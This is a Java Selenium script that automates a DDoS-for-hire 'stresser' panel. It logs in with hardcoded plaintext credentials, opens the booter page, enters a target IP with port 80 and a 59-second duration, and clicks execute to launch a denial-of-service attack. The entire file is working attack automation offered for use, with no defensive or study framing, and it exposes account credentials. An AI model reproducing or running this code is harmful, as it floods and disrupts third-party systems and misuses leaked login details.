import java.util.concurrent.TimeUnit;

import org.openqa.selenium.By;
import org.openqa.selenium.Keys;
import org.openqa.selenium.PageLoadStrategy;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.Select;
import org.openqa.selenium.support.ui.WebDriverWait;
import org.openqa.selenium.remote.DesiredCapabilities;

public class BehaviorsForHardStresser {
	
	private WebDriver driver;
	
	private WebDriverWait wait;
	  
	private ChromeOptions options = new ChromeOptions();
	
	public void setup() {
		
		System.setProperty("webdriver.chrome.driver", "C:\\Users\\dmahi\\Desktop\\chromedriver.exe");
		
		driver = new ChromeDriver();
		
		wait = new WebDriverWait(driver, 10);
		
		options.addArguments("start-maximized");
		options.setCapability("acceptSslCerts", true);
		options.setCapability("acceptInsecureCerts", true);
		
		driver.navigate().to("https://hardstresser.com/panel/login.php");
		
		driver.manage().timeouts().implicitlyWait(3, TimeUnit.SECONDS);
	}
	
	public void enterUser() {
		
		wait.until(ExpectedConditions.titleIs("Login Panel"));
		String username = "SNR322";
		String userXPath = "/html/body/form/input[1]";
		
		driver.findElement(By.xpath(userXPath)).sendKeys(username);
		
		driver.manage().timeouts().implicitlyWait(1, TimeUnit.SECONDS);
	}
	
	public void enterPass() {
		
		String password = "Scoops79";
		String passXPath = "/html/body/form/input[2]";
		
		driver.findElement(By.xpath(passXPath)).sendKeys(password);
	}
	
	public void login() {
		
		String loginXPath = "/html/body/form/button";
		
		driver.findElement(By.xpath(loginXPath)).click();
		
		wait.until(ExpectedConditions.titleIs("HardStresser.com | Panel"));
	}
	
	public void enterHub() {
		
		driver.navigate().to("https://hardstresser.com/panel/booter.php");
	}
	
	public void enterAttackDetails(String IP) {
		
		String IPXPath = "/html/body/div[1]/div[2]/div[3]/div[2]/div[3]/form/div[2]/input";
		
		driver.findElement(By.xpath(IPXPath)).sendKeys(IP);
		
		String portXPath = "/html/body/div[1]/div[2]/div[3]/div[2]/div[3]/form/div[2]/div[1]/input[1]";
		
		driver.findElement(By.xpath(portXPath)).sendKeys("80");
		
		String timeXPath = "/html/body/div[1]/div[2]/div[3]/div[2]/div[3]/form/div[2]/div[1]/input[2]";
		
		driver.findElement(By.xpath(timeXPath)).sendKeys("59");
		
		String typeXPath = "/html/body/div[2]/div[3]/div[3]/div[2]/div[2]/form/div[1]/div[2]/div[2]/span[1]/select";
		
		driver.manage().timeouts().implicitlyWait(1, TimeUnit.SECONDS);
	}
	
	public void execute() {
		
		String executeXpath = "/html/body/div[1]/div[2]/div[3]/div[2]/div[3]/form/div[2]/button";
		
		driver.findElement(By.xpath(executeXpath)).click();
		
		driver.manage().timeouts().implicitlyWait(3, TimeUnit.SECONDS);
		
	}
	
	public void reload() {
		
		driver.navigate().refresh();
	}
}
